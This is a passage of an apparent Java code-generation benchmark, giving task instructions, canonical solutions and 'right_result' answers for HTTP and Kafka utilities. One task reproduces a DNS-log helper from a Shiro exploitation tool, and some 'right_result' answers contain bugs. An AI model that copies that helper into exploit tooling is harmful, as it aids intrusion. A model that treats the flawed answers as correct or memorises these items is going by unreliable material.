StringBuilder response = new StringBuilder();\n            try (BufferedReader br = new BufferedReader(\n                    new InputStreamReader(connection.getInputStream(), StandardCharsets.UTF_8))) {\n                String line;\n                while ((line = br.readLine()) != null) {\n                    response.append(line);\n                }\n            }\n\n            return response.toString();\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 8,
    "Instruction": "Task Description: Create a Kafka topic using Java's AdminClient API with configurable properties, partitions, and replication factor.\n\nClass Description: The KafkaTopicCreator class provides functionality to create Kafka topics programmatically. It encapsulates the AdminClient configuration and topic creation logic, handling the connection lifecycle and operation timeout.\n\nAttributes:\n- adminClientProperties: Map<String, Object> - Configuration properties for the AdminClient, initialized from KafkaProperties\n- operationTimeout: int - Timeout duration in seconds for Kafka operations (default: 30)\n\nMethods:\n- createTopic(String topicName, int partitions, short replicationFactor) -> void - Creates a new Kafka topic with the specified name, partition count, and replication factor. Throws Exception if operation fails or times out.\n- getAdminClientProperties() -> Map<String, Object> - Returns an unmodifiable view of the AdminClient configuration properties\n\nConstructor:\n- KafkaTopicCreator(KafkaProperties kafkaProperties) - Initializes the class with Kafka configuration properties",
    "Canonical_solution": "import org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport org.apache.kafka.clients.admin.CreateTopicsResult;\nimport org.apache.kafka.clients.admin.NewTopic;\nimport org.apache.kafka.common.KafkaFuture;\nimport org.springframework.boot.autoconfigure.kafka.KafkaProperties;\nimport java.util.Collections;\nimport java.util.Map;\nimport java.util.concurrent.TimeUnit;\n\npublic class KafkaTopicCreator {\n\n    private final Map<String, Object> adminClientProperties;\n    private final int operationTimeout = 30;\n\n    public KafkaTopicCreator(KafkaProperties kafkaProperties) {\n        this.adminClientProperties = kafkaProperties.buildAdminProperties(null);\n    }\n\n    public void createTopic(String topicName, int partitions, short replicationFactor) throws Exception {\n        try (AdminClient adminClient = AdminClient.create(this.adminClientProperties)) {\n            NewTopic newTopic = new NewTopic(topicName, partitions, replicationFactor);\n            CreateTopicsResult createTopicsResult = adminClient.createTopics(Collections.singletonList(newTopic));\n            KafkaFuture<Void> future = createTopicsResult.all();\n            future.get(this.operationTimeout, TimeUnit.SECONDS);\n        }\n    }\n\n    public Map<String, Object> getAdminClientProperties() {\n        return Collections.unmodifiableMap(this.adminClientProperties);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 34,
    "right_result": "```java\nimport org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.NewTopic;\nimport org.apache.kafka.common.config.SaslConfigs;\nimport org.apache.kafka.common.config.SslConfigs;\n\nimport java.time.Duration;\nimport java.util.Collections;\nimport java.util.Map;\nimport java.util.Properties;\n\npublic class KafkaTopicCreator {\n    private final Map<String, Object> adminClientProperties;\n    private final int operationTimeout;\n\n    public KafkaTopicCreator(KafkaProperties kafkaProperties) {\n        Properties properties = new Properties();\n        properties.put(\"bootstrap.servers\", kafkaProperties.getBootstrapServers());\n        if (kafkaProperties.getSaslMechanism() != null) {\n            properties.put(SaslConfigs.SASL_MECHANISM, kafkaProperties.getSaslMechanism());\n            properties.put(SaslConfigs.SASL_JAAS_CONFIG, kafkaProperties.getSaslJaasConfig());\n        }\n        if (kafkaProperties.isSslEnabled()) {\n            properties.put(SslConfigs.SSL_TRUSTSTORE_LOCATION_CONFIG, kafkaProperties.getSslTruststoreLocation());\n            properties.put(SslConfigs.SSL_TRUSTSTORE_PASSWORD_CONFIG, kafkaProperties.getSslTruststorePassword());\n        }\n\n        this.adminClientProperties = Map.copyOf((Map<String, Object>) (Map<?, ?>) properties);\n        this.operationTimeout = kafkaProperties.getOperationTimeoutSeconds() > 0 ? kafkaProperties.getOperationTimeoutSeconds() : 30;\n    }\n\n    public void createTopic(String topicName, int partitions, short replicationFactor) throws Exception {\n        try (AdminClient adminClient = AdminClient.create(adminClientProperties)) {\n            NewTopic newTopic = new NewTopic(topicName, partitions, replicationFactor);\n            adminClient.createTopics(Collections.singletonList(newTopic), Duration.ofSeconds(operationTimeout)).all().get();\n        } catch (Exception e) {\n            throw new Exception(\"Failed to create topic: \" + topicName, e);\n        }\n    }\n\n    public Map<String, Object> getAdminClientProperties() {\n        return Collections.unmodifiableMap(adminClientProperties);\n    }\n}\n```"
  },
  {
    "Task_id": 81,
    "Instruction": "Task Description: Create a Java class that interacts with a DNS log service to retrieve a domain and session information for tracking DNS requests.\n\nClass Description: The GetDNSLogRecordTask class is responsible for making an HTTP GET request to a DNS log service (dnslog.cn) to obtain a temporary domain and session cookie. It stores the retrieved information in a configuration object and tracks the operation's status.\n\nAttributes:\n- status: int - Tracks the execution status of the task (1 for success, -1 for failure)\n- config: Config - Configuration object where DNS log information will be stored\n\nMethods:\n- GetDNSLogRecordTask(Config config) -> None - Constructor that initializes the class with a configuration object\n- getStatus() -> int - Returns the current status of the task\n- execute() -> Integer - Performs the HTTP request to get DNS log information and returns 1 regardless of success/failure (legacy behavior)",
    "Canonical_solution": "import com.shiroexploit.util.Config;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class GetDNSLogRecordTask {\n\n    private int status = 0;\n    private Config config;\n\n    public GetDNSLogRecordTask(Config config){\n        this.config = config;\n    }\n\n    public int getStatus(){\n        return status;\n    }\n\n    public Integer execute() {\n        HttpURLConnection connection = null;\n        InputStream inputStream = null;\n        BufferedReader reader = null;\n        StringBuffer sb = new StringBuffer();\n\n        try {\n            connection = (HttpURLConnection)new URL(\"http://www.dnslog.cn/getdomain.php\").openConnection();\n            connection.setRequestMethod(\"GET\");\n            connection.setConnectTimeout(5000);\n            connection.setReadTimeout(5000);\n            connection.connect();\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode == 200) {\n                String sessinoId = connection.getHeaderField(\"Set-Cookie\");\n                sessinoId = sessinoId.split(\";\")[0];\n\n                inputStream = connection.getInputStream();\n                reader = new BufferedReader(new InputStreamReader(inputStream));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    sb.append(line);\n                }\n\n                Config.getInstance().setSessionId(sessinoId);\n                Config.getInstance().setDnsLogRecord(sb.toString());\n                status = 1;\n                return 1;\n            }\n        }\n        catch (IOException e) {\n            status = -1;\n            return 1;\n        } finally {\n            try {\n                if (connection != null) connection.disconnect();\n                if (inputStream != null) inputStream.close();\n                if (reader != null) reader.close();\n            } catch (IOException e) {\n                status = -1;\n                return 1;\n            }\n        }\n\n        status = -1;\n        return 1;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class GetDNSLogRecordTask {\n    private int status;\n    private Config config;\n\n    public GetDNSLogRecordTask(Config config) {\n        this.status = -1;\n        this.config = config;\n    }\n\n    public int getStatus() {\n        return status;\n    }\n\n    public Integer execute() {\n        try {\n            URL url = new URL(\"http://dnslog.cn/getdomain.php\");\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String domain = reader.readLine();\n            String sessionCookie = connection.getHeaderField(\"Set-Cookie\");\n\n            if (domain != null && !domain.isEmpty()) {\n                config.setDnsDomain(domain);\n                config.setSessionCookie(sessionCookie);\n                status = 1;\n            } else {\n                status = -1;\n            }\n\n            reader.close();\n            connection.disconnect();\n        } catch (Exception e) {\n            status = -1;\n        }\n\n        return 1;\n    }\n}\n```"
  },
  {
    "Task_id": 84,
    "Instruction": "Task Description: Create a Java utility class for making HTTP POST requests with JSON payloads, handling authentication, and processing JSON responses.\n\nClass Description: JobRemotingUtil is a utility class that provides functionality for making remote HTTP POST requests with JSON data. It handles connection setup, request configuration, payload serialization, response processing, and error handling. The class includes logging capabilities and supports access token authentication.\n\nAttributes:\nlogger: [Logger] - SLF4J logger instance for logging errors and debug information\nXXL_RPC_ACCESS_TOKEN: [String] - Constant string for the authentication token header name\n\nMethods:\npostBody: [Name](String url, String accessToken, Object requestObj, int timeout) -> ReturnT<String> - Makes an HTTP POST request to the specified URL with the given request object serialized as JSON. Handles authentication via access token, sets appropriate headers, and processes the JSON response. Returns a ReturnT<String> object containing the response status, message, and content. The timeout parameter specifies the read timeout in seconds.",
    "Canonical_solution": "import com.wugui.datatx.core.biz.model.ReturnT;\nimport com.wugui.datax.rpc.util.json.BasicJson;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\n\npublic class JobRemotingUtil {\n    private static Logger logger = LoggerFactory.getLogger(JobRemotingUtil.class);\n    public static String XXL_RPC_ACCESS_TOKEN = \"XXL-RPC-ACCESS-TOKEN\";\n\n    public static ReturnT<String> postBody(String url, String accessToken, Object requestObj, int timeout) {\n        HttpURLConnection connection = null;\n        BufferedReader bufferedReader = null;\n        try {\n            URL realUrl = new URL(url);\n            connection = (HttpURLConnection) realUrl.openConnection();\n\n            connection.setRequestMethod(\"POST\");\n            connection.setDoOutput(true);\n            connection.setDoInput(true);\n            connection.setUseCaches(false);\n            connection.setReadTimeout(timeout * 1000);\n            connection.setConnectTimeout(3 * 1000);\n            connection.setRequestProperty(\"connection\", \"Keep-Alive\");\n            connection.setRequestProperty(\"Content-Type\", \"application/json;charset=UTF-8\");\n            connection.setRequestProperty(\"Accept-Charset\", \"application/json;charset=UTF-8\");\n\n            if(accessToken!=null && accessToken.trim().length()>0){\n                connection.setRequestProperty(XXL_RPC_ACCESS_TOKEN, accessToken);\n            }\n\n            connection.connect();\n\n            String requestBody = BasicJson.toJson(requestObj);\n            DataOutputStream dataOutputStream = new DataOutputStream(connection.getOutputStream());\n            dataOutputStream.writeBytes(requestBody);\n            dataOutputStream.flush();\n            dataOutputStream.close();\n\n            int statusCode = connection.getResponseCode();\n            if (statusCode != 200) {\n                return new ReturnT<String>(ReturnT.FAIL_CODE, \"xxl-rpc remoting fail, StatusCode(\"+ statusCode +\") invalid. for url : \" + url);\n            }\n\n            bufferedReader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            StringBuilder result = new StringBuilder();\n            String line;\n            while ((line = bufferedReader.readLine()) != null) {\n                result.append(line);\n            }\n            String resultJson = result.toString();\n\n            try {\n                Map<String, Object> resultMap = BasicJson.parseMap(resultJson);\n\n                ReturnT<String> returnT = new ReturnT<String>();\n                if (resultMap==null) {\n                    returnT.setCode(ReturnT.FAIL_CODE);\n                    returnT.setMsg(\"AdminBizClient Remoting call fail.\");\n                } else {\n                    returnT.setCode(Integer.valueOf(String.valueOf(resultMap.get(\"code\"))));\n                    returnT.setMsg(String.valueOf(resultMap.get(\"msg\")));\n                    returnT.setContent(String.valueOf(resultMap.get(\"content\")));\n                }\n                return returnT;\n            } catch (Exception e) {\n                logger.error(\"xxl-rpc remoting (url=\"+url+\") response content invalid(\"+ resultJson +\").\", e);\n                return new ReturnT<String>(ReturnT.FAIL_CODE, \"xxl-rpc remoting (url=\"+url+\") response content invalid(\"+ resultJson +\").\");\n            }\n\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n            return new ReturnT<String>(ReturnT.FAIL_CODE, \"xxl-rpc remoting error(\"+ e.getMessage() +\"), for url : \" + url);\n        } finally {\n            try {\n                if (bufferedReader != null) {\n                    bufferedReader.close();\n                }\n                if (connection != null) {\n                    connection.disconnect();\n                }\n            } catch (Exception e2) {\n                logger.error(e2.getMessage(), e2);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport com.alibaba.fastjson.JSON;\nimport com.alibaba.fastjson.JSONObject;\n\npublic class JobRemotingUtil {\n    private static final Logger logger = LoggerFactory.getLogger(JobRemotingUtil.class);\n    public static final String XXL_RPC_ACCESS_TOKEN = \"XXL-RPC-ACCESS-TOKEN\";\n\n    public static ReturnT<String> postBody(String url, String accessToken, Object requestObj, int timeout) {\n        HttpURLConnection connection = null;\n        try {\n            URL requestUrl = new URL(url);\n            connection = (HttpURLConnection) requestUrl.openConnection();\n            connection.setRequestMethod(\"POST\");\n            connection.setDoOutput(true);\n            connection.setDoInput(true);\n            connection.setUseCaches(false);\n            connection.setRequestProperty(\"Content-Type\", \"application/json;charset=UTF-8\");\n            if (accessToken != null && !accessToken.isEmpty()) {\n                connection.setRequestProperty(XXL_RPC_ACCESS_TOKEN, accessToken);\n            }\n            connection.setConnectTimeout(timeout * 1000);\n            connection.setReadTimeout(timeout * 1000);\n\n            String jsonParam = JSON.toJSONString(requestObj);\n            byte[] paramBytes = jsonParam.getBytes(\"UTF-8\");\n            connection.setRequestProperty(\"Content-Length\", String.valueOf(paramBytes.length));\n            DataOutputStream out = new DataOutputStream(connection.getOutputStream());\n            out.write(paramBytes);\n            out.flush();\n            out.close();\n\n            int responseCode = connection.getResponseCode();\n            BufferedReader reader;\n            if (responseCode >= 200 && responseCode < 300) {\n                reader = new BufferedReader(new InputStreamReader(connection.getInputStream(), \"UTF-8\"));\n            } else {\n                reader = new BufferedReader(new InputStreamReader(connection.getErrorStream(), \"UTF-8\"));\n            }\n\n            StringBuilder result = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                result.append(line);\n            }\n            reader.close();\n\n            return new ReturnT<>(ReturnT.SUCCESS_CODE, result.toString(), \"OK\");\n        } catch (Exception e) {\n            logger.error(\"post body error, url:{}\", url, e);\n            return new ReturnT<>(ReturnT.FAIL_CODE, null, e.getMessage());\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n    }\n\n    public static class ReturnT<T> {\n        public static final int SUCCESS_CODE = 200;\n        public static final int FAIL_CODE = 500;\n\n        private int code;\n        private String msg;\n        private T content;\n\n        public ReturnT(int code, T content, String msg) {\n            this.code = code;\n            this.content = content;\n            this.msg = msg;\n        }\n\n        public int getCode() {\n            return code;\n        }\n\n        public String getMsg() {\n            return msg;\n        }\n\n        public T getContent() {\n            return content;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 87,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality for making network requests, with support for gzip compression, proxy interaction, and error handling.\n\nClass Description: The HttpService class provides HTTP client capabilities for making POST requests to specified endpoints. It handles request construction, connection management, response processing, and includes features like gzip compression, SSL socket configuration, proxy server interaction, and automatic retries for failed requests.\n\nAttributes:\n\nshouldGzipRequestPayload: boolean - Determines whether request payload should be gzip compressed\nMIN_UNAVAILABLE_HTTP_RESPONSE_CODE: int - Minimum HTTP response code considered as service unavailable (500)\nMAX_UNAVAILABLE_HTTP_RESPONSE_CODE: int - Maximum HTTP response code considered as service unavailable (599)\nLOGTAG: String - Tag used for logging messages\nHTTP_OUTPUT_STREAM_BUFFER_SIZE: int - Buffer size for output streams (8192 bytes)\nCONTENT_ENCODING_HEADER: String - Header key for content encoding\nGZIP_CONTENT_TYPE_HEADER: String - Value for gzip content encoding\n\nMethods:\n\nperformRequest: performRequest(String endpointUrl, ProxyServerInteractor interactor, Map<String, Object> params, SSLSocketFactory socketFactory) -> byte[] - Makes an HTTP POST request to the specified endpoint with optional parameters and SSL configuration. Handles retries for failed requests and returns the response body as bytes. Throws ServiceUnavailableException for 5xx responses and IOException for other failures.\n\ngetBufferedOutputStream: getBufferedOutputStream(OutputStream out) -> OutputStream - Creates a buffered output stream, optionally wrapped in a GZIPOutputStream based on shouldGzipRequestPayload.\n\nisProxyRequest: isProxyRequest(String endpointUrl) -> boolean - Determines if the request is a proxy request by checking the endpoint URL.\n\nslurp: slurp(InputStream inputStream) -> byte[] - Reads all bytes from an input stream and returns them as a byte array.",
    "Canonical_solution": "import android.content.Context;\nimport android.net.ConnectivityManager;\nimport android.net.NetworkInfo;\nimport android.net.Uri;\n\nimport java.io.BufferedOutputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.EOFException;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\nimport java.util.zip.GZIPOutputStream;\n\nimport javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLSocketFactory;\n\npublic class HttpService implements RemoteService {\n\n    private final boolean shouldGzipRequestPayload;\n    private static final int MIN_UNAVAILABLE_HTTP_RESPONSE_CODE = HttpURLConnection.HTTP_INTERNAL_ERROR;\n    private static final int MAX_UNAVAILABLE_HTTP_RESPONSE_CODE = 599;\n    private static final String LOGTAG = \"MixpanelAPI.Message\";\n    private static final int HTTP_OUTPUT_STREAM_BUFFER_SIZE = 8192;\n    private static final String CONTENT_ENCODING_HEADER = \"Content-Encoding\";\n    private static final String GZIP_CONTENT_TYPE_HEADER = \"gzip\";\n\n    public HttpService(boolean shouldGzipRequestPayload) {\n        this.shouldGzipRequestPayload = shouldGzipRequestPayload;\n    }\n\n    @Override\n    public byte[] performRequest(String endpointUrl, ProxyServerInteractor interactor, Map<String, Object> params, SSLSocketFactory socketFactory) throws ServiceUnavailableException, IOException {\n        MPLog.v(LOGTAG, \"Attempting request to \" + endpointUrl);\n\n        byte[] response = null;\n        int retries = 0;\n        boolean succeeded = false;\n        while (retries < 3 && !succeeded) {\n            InputStream in = null;\n            OutputStream out = null;\n            OutputStream bout = null;\n            HttpURLConnection connection = null;\n\n            try {\n                final URL url = new URL(endpointUrl);\n                connection = (HttpURLConnection) url.openConnection();\n                if (null != socketFactory && connection instanceof HttpsURLConnection) {\n                    ((HttpsURLConnection) connection).setSSLSocketFactory(socketFactory);\n                }\n\n                if (interactor != null && isProxyRequest(endpointUrl)) {\n                    Map<String,String> headers = interactor.getProxyRequestHeaders();\n                    if (headers != null) {\n                        for (Map.Entry<String, String> entry : headers.entrySet()) {\n                            connection.setRequestProperty(entry.getKey(), entry.getValue());\n                        }\n                    }\n                }\n\n                connection.setConnectTimeout(2000);\n                connection.setReadTimeout(30000);\n                if (null != params) {\n                    Uri.Builder builder = new Uri.Builder();\n                    for (Map.Entry<String, Object> param : params.entrySet()) {\n                        builder.appendQueryParameter(param.getKey(), param.getValue().toString());\n                    }\n                    String query = builder.build().getEncodedQuery();\n                    if (shouldGzipRequestPayload) {\n                        connection.setRequestProperty(CONTENT_ENCODING_HEADER, GZIP_CONTENT_TYPE_HEADER);\n                    } else {\n                        connection.setFixedLengthStreamingMode(query.getBytes().length);\n                    }\n                    connection.setDoOutput(true);\n                    connection.setRequestMethod(\"POST\");\n                    out = connection.getOutputStream();\n                    bout = getBufferedOutputStream(out);\n                    bout.write(query.getBytes(\"UTF-8\"));\n                    bout.flush();\n                    bout.close();\n                    bout = null;\n                    out.close();\n                    out = null;\n                }\n                if (interactor != null && isProxyRequest(endpointUrl)) {\n                    interactor.onProxyResponse(endpointUrl, connection.getResponseCode());\n                }\n                in = connection.getInputStream();\n                response = slurp(in);\n                in.close();\n                in = null;\n                succeeded = true;\n            } catch (final EOFException e) {\n                MPLog.d(LOGTAG, \"Failure to connect, likely caused by a known issue with Android lib. Retrying.\");\n                retries = retries + 1;\n            } catch (final IOException e) {\n                if (connection != null && connection.getResponseCode() >= MIN_UNAVAILABLE_HTTP_RESPONSE_CODE && connection.getResponseCode() <= MAX_UNAVAILABLE_HTTP_RESPONSE_CODE) {\n                    throw new ServiceUnavailableException(\"Service Unavailable\", connection.getHeaderField(\"Retry-After\"));\n                } else {\n                    throw e;\n                }\n            }\n            finally {\n                if (null != bout)\n                    try { bout.close(); } catch (final IOException e) {}\n                if (null != out)\n                    try { out.close(); } catch (final IOException e) {}\n                if (null != in)\n                    try { in.close(); } catch (final IOException e) {}\n                if (null != connection)\n                    connection.disconnect();\n            }\n        }\n        if (retries >= 3) {\n            MPLog.v(LOGTAG, \"Could not connect to Mixpanel service after three retries.\");\n        }\n        return response;\n    }\n\n    private OutputStream getBufferedOutputStream(OutputStream out) throws IOException {\n        if(shouldGzipRequestPayload) {\n          return new GZIPOutputStream(new BufferedOutputStream(out), HTTP_OUTPUT_STREAM_BUFFER_SIZE);\n        } else {\n            return new BufferedOutputStream(out);\n        }\n    }\n\n    private static boolean isProxyRequest(String endpointUrl) {\n        return !endpointUrl.toLowerCase().contains(MIXPANEL_API.toLowerCase());\n    }\n\n    private static byte[] slurp(final InputStream inputStream) throws IOException {\n        final ByteArrayOutputStream buffer = new ByteArrayOutputStream();\n        int nRead;\n        byte[] data = new byte[8192];\n\n        while ((nRead = inputStream.read(data, 0, data.length)) != -1) {\n            buffer.write(data, 0, nRead);\n        }\n\n        buffer.flush();\n        return buffer.toByteArray();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.Map;\nimport javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLSocketFactory;\n\npublic class HttpService {\n    protected boolean shouldGzipRequestPayload = true;\n    protected int MIN_UNAVAILABLE_HTTP_RESPONSE_CODE = 500;\n    protected int MAX_UNAVAILABLE_HTTP_RESPONSE_CODE = 599;\n    protected String LOGTAG = \"HttpService\";\n    protected int HTTP_OUTPUT_STREAM_BUFFER_SIZE = 8192;\n    protected String CONTENT_ENCODING_HEADER = \"Content-Encoding\";\n    protected String GZIP_CONTENT_TYPE_HEADER = \"gzip\";\n\n    public byte[] performRequest(String endpointUrl, ProxyServerInteractor interactor, Map<String, Object> params, SSLSocketFactory socketFactory) throws IOException, ServiceUnavailableException {\n        HttpURLConnection connection = null;\n        try {\n            URL url = new URL(endpointUrl);\n            if (url.getProtocol().toLowerCase().equals(\"https\")) {\n                ((HttpsURLConnection) connection).setSSLSocketFactory(socketFactory);\n            }\n\n            if (isProxyRequest(endpointUrl)) {\n                Proxy proxy = interactor.getProxy();\n                connection = (HttpURLConnection) url.openConnection(proxy);\n            } else {\n                connection = (HttpURLConnection) url.openConnection();\n            }\n\n            connection.setRequestMethod(\"POST\");\n            connection.setDoOutput(true);\n            connection.setUseCaches(false);\n\n            if (shouldGzipRequestPayload) {\n                connection.setRequestProperty(CONTENT_ENCODING_HEADER, GZIP_CONTENT_TYPE_HEADER);\n            }\n\n            OutputStream out = getBufferedOutputStream(connection.getOutputStream());\n            ObjectOutputStream oos = new ObjectOutputStream(out);\n            oos.writeObject(params);\n            oos.flush();\n            oos.close();\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode >= MIN_UNAVAILABLE_HTTP_RESPONSE_CODE && responseCode <= MAX_UNAVAILABLE_HTTP_RESPONSE_CODE) {\n                throw new ServiceUnavailableException(\"Service unavailable with status code: \" + responseCode);\n            }\n\n            InputStream inputStream = connection.getInputStream();\n            return slurp(inputStream);\n        } catch (IOException e) {\n            throw new IOException(\"Failed to perform HTTP request: \" + e.getMessage(), e);\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n    }\n\n    protected OutputStream getBufferedOutputStream(OutputStream out) throws IOException {\n        if (shouldGzipRequestPayload) {\n            return new BufferedOutputStream(new GZIPOutputStream(out), HTTP_OUTPUT_STREAM_BUFFER_SIZE);\n        } else {\n            return new BufferedOutputStream(out, HTTP_OUTPUT_STREAM_BUFFER_SIZE);\n        }\n    }\n\n    protected boolean isProxyRequest(String endpointUrl) {\n        return endpointUrl.contains(\"proxy\");\n    }\n\n    protected byte[] slurp(InputStream inputStream) throws IOException {\n        ByteArrayOutputStream result = new ByteArrayOutputStream();\n        byte[] buffer = new byte[HTTP_OUTPUT_STREAM_BUFFER_SIZE];\n        int length;\n        while ((length = inputStream.read(buffer)) != -1) {\n            result.write(buffer, 0, length);\n        }\n        return result.toByteArray();\n    }\n}\n\nclass ProxyServerInteractor {\n    public Proxy getProxy() {\n        return new Proxy(Proxy.Type.HTTP, new InetSocketAddress(\"localhost\", 8080));\n    }\n}\n\nclass ServiceUnavailableException extends Exception {\n    public ServiceUnavailableException(String message) {\n        super(message);\n    }\n}\n```"
  },
  {
    "Task_id": 88,
    "Instruction": "Task Description: Create a Java utility class for making HTTP requests and handling responses, including JSON parsing and connection management.\n\nClass Description: HttpRequester is a utility class that provides methods for creating HTTP connections, sending requests, and processing responses. It supports handling both successful responses and error streams, with specialized methods for parsing JSON responses. The class manages connection lifecycle and resource cleanup.\n\nAttributes: (None - this is a purely static utility class)\n\nMethods:\n\nMethod1: getConnectionFromRoute(String apiUrl, Route route, String... params) -> HttpURLConnection - Creates an HTTP connection from a route template and parameters. Sets up the connection with proper headers and request method.\n\nMethod2: getConnectionFromCompiledRoute(String apiUrl, Route.CompiledRoute route) -> HttpURLConnection - Creates an HTTP connection from a pre-compiled route. Configures the connection with headers and request method.\n\nMethod3: parseInputStreamAndClose(InputStream inputStream) -> String - Internal method that reads an input stream into a string and closes the stream.\n\nMethod4: parseString(HttpURLConnection connection) -> String - Reads the successful response from a connection into a string.\n\nMethod5: parseStringAndDisconnect(HttpURLConnection connection) -> String - Reads the response into a string and disconnects the connection.\n\nMethod6: parseErrorString(HttpURLConnection connection) -> String - Reads the error stream from a connection into a string.\n\nMethod7: parseErrorStringAndDisconnect(HttpURLConnection connection) -> String - Reads the error stream into a string and disconnects the connection.\n\nMethod8: parseJSONObject(HttpURLConnection connection) -> JSONObject - Parses the response as a JSON object.\n\nMethod9: parseJSONObjectAndDisconnect(HttpURLConnection connection) -> JSONObject - Parses the response as a JSON object and disconnects the connection.\n\nMethod10: parseJSONArray(HttpURLConnection connection) -> JSONArray - Parses the response as a JSON array.\n\nMethod11: parseJSONArrayAndDisconnect(HttpURLConnection connection) -> JSONArray - Parses the response as a JSON array and disconnects the connection.",
    "Canonical_solution": "import org.json.JSONArray;\nimport org.json.JSONException;\nimport org.json.JSONObject;\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequester {\n\n    public static HttpURLConnection getConnectionFromRoute(String apiUrl, Route route, String... params) throws IOException {\n        return getConnectionFromCompiledRoute(apiUrl, route.compile(params));\n    }\n\n    public static HttpURLConnection getConnectionFromCompiledRoute(String apiUrl, Route.CompiledRoute route) throws IOException {\n        String url = apiUrl + route.getCompiledRoute();\n        HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();\n        connection.setFixedLengthStreamingMode(0);\n        connection.setRequestMethod(route.getMethod().name());\n        String agentString = System.getProperty(\"http.agent\")\n                + \"; ReVanced/\" + Utils.getAppVersionName()\n                + \" (\" + Utils.getPatchesReleaseVersion() + \")\";\n        connection.setRequestProperty(\"User-Agent\", agentString);\n        return connection;\n    }\n\n    private static String parseInputStreamAndClose(InputStream inputStream) throws IOException {\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {\n            StringBuilder jsonBuilder = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                jsonBuilder.append(line);\n                jsonBuilder.append('\\n');\n            }\n            return jsonBuilder.toString();\n        }\n    }\n\n    public static String parseString(HttpURLConnection connection) throws IOException {\n        return parseInputStreamAndClose(connection.getInputStream());\n    }\n\n    public static String parseStringAndDisconnect(HttpURLConnection connection) throws IOException {\n        String result = parseString(connection);\n        connection.disconnect();\n        return result;\n    }\n\n    public static String parseErrorString(HttpURLConnection connection) throws IOException {\n        InputStream errorStream = connection.getErrorStream();\n        if (errorStream == null) {\n            return \"\";\n        }\n        return parseInputStreamAndClose(errorStream);\n    }\n\n    public static String parseErrorStringAndDisconnect(HttpURLConnection connection) throws IOException {\n        String result = parseErrorString(connection);\n        connection.disconnect();\n        return result;\n    }\n\n    public static JSONObject parseJSONObject(HttpURLConnection connection) throws JSONException, IOException {\n        return new JSONObject(parseString(connection));\n    }\n\n    public static JSONObject parseJSONObjectAndDisconnect(HttpURLConnection connection) throws JSONException, IOException {\n        JSONObject object = parseJSONObject(connection);\n        connection.disconnect();\n        return object;\n    }\n\n    public static JSONArray parseJSONArray(HttpURLConnection connection) throws JSONException, IOException {\n        return new JSONArray(parseString(connection));\n    }\n\n    public static JSONArray parseJSONArrayAndDisconnect(HttpURLConnection connection) throws JSONException, IOException {\n        JSONArray array = parseJSONArray(connection);\n        connection.disconnect();\n        return array;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport org.json.JSONArray;\nimport org.json.JSONObject;\n\npublic class HttpRequester {\n\n    public static HttpURLConnection getConnectionFromRoute(String apiUrl, Route route, String... params) throws IOException {\n        String compiledUrl = route.compile(params);\n        URL url = new URL(apiUrl + compiledUrl);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(route.getMethod().name());\n        for (String header : route.getHeaders()) {\n            String[] parts = header.split(\":\");\n            if (parts.length == 2) {\n                connection.setRequestProperty(parts[0].trim(), parts[1].trim());\n            }\n        }\n        return connection;\n    }\n\n    public static HttpURLConnection getConnectionFromCompiledRoute(String apiUrl, Route.CompiledRoute route) throws IOException {\n        URL url = new URL(apiUrl + route.getUrl());\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(route.getMethod().name());\n        for (String header : route.getHeaders()) {\n            String[] parts = header.split(\":\");\n            if (parts.length == 2) 